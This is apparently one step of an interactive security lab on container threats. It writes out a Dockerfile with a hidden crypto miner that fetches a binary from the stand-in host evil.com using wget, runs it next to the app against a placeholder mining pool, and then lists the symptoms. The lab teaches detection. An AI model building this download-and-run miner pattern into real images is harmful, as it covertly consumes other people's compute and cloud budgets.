## Step 7: Simulate crypto miner in image

```bash
# Container with hidden crypto miner
cat > /tmp/cryptominer-dockerfile << 'EOF'
FROM node:16

WORKDIR /app
COPY package.json .
RUN npm install

# Hidden: Install and run crypto miner
RUN wget -q -O /usr/local/bin/miner http://evil.com/xmrig && \
    chmod +x /usr/local/bin/miner

COPY app.js .

# Start app AND miner
CMD node app.js & /usr/local/bin/miner --url=pool.evil.com --user=attacker
EOF

cat /tmp/cryptominer-dockerfile

echo ""
echo "Crypto miner symptoms:"
echo "- High CPU usage"
echo "- Increased cloud costs"
echo "- Degraded application performance"
echo "- Network traffic to mining pools"
```{{exec}}

Crypto miners hidden in images cause high CPU usage and increased cloud costs while going unnoticed.
